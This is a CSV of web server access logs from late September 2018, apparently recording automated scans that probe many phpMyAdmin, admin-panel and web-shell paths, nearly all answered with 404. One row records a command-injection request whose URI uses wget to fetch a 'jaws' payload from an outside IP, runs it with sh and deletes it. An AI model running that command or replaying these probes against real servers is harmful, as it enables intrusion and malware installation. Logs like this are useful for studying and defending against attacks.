"IP",           "Date",              "Method", "Status", "Size",    "URI", "UA"
"114.6.34.194","30/Sep/2018:13:15:29","GET","404","510","/shaAdmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"217.128.171.65","30/Sep/2018:13:37:50","GET","400","0","/shell?cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo"," Gemini/2.0",
"111.231.190.181","30/Sep/2018:13:41:33","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"111.231.190.181","30/Sep/2018:13:41:33","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"190.102.146.26","30/Sep/2018:13:55:20","GET","404","500","/test.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:21","GET","404","501","/shell.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:24","GET","404","501","/shell.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:24","GET","404","509","/scripts/setup.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:24","GET","404","520","/phpmyadmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:24","GET","404","520","/phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:24","GET","404","525","/phpmyadmin/scripts/db___.init.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:24","GET","404","525","/phpMyAdmin/scripts/db___.init.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:26","POST","404","505","/wp-admins.php"," Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
"190.102.146.26","30/Sep/2018:13:55:27","POST","404","502","/wshell.php"," Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
"190.102.146.26","30/Sep/2018:13:55:27","POST","404","502","/xshell.php"," Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
"190.102.146.26","30/Sep/2018:13:55:32","POST","404","500","/test.php"," Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
"190.102.146.26","30/Sep/2018:13:55:36","POST","404","500","/test.php"," Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
"190.102.146.26","30/Sep/2018:13:55:44","GET","404","511","/phpmyadmin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:44","GET","404","511","/phpMyAdmin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:45","GET","404","508","/admin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:45","GET","404","509","/dbadmin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:45","GET","404","516","/web/phpMyAdmin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:45","GET","404","511","/admin/pma/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:45","GET","404","511","/admin/PMA/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:46","GET","404","513","/admin/mysql/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:46","GET","404","514","/admin/mysql2/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:46","GET","404","518","/admin/phpmyadmin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:46","GET","404","518","/admin/phpMyAdmin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:46","GET","404","519","/admin/phpmyadmin2/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:46","GET","404","512","/mysqladmin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:46","GET","404","513","/mysql-admin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:46","GET","404","510","/phpadmin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:46","GET","404","510","/phpAdmin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:47","GET","404","513","/phpmyadmin0/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:47","GET","404","513","/phpmyadmin1/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:47","GET","404","513","/phpmyadmin2/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:47","GET","404","518","/phpMyAdmin-4.4.0/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:47","GET","404","509","/myadmin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:47","GET","404","510","/myadmin2/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:47","GET","404","518","/xampp/phpmyadmin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:47","GET","404","516","/phpMyadmin_bak/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
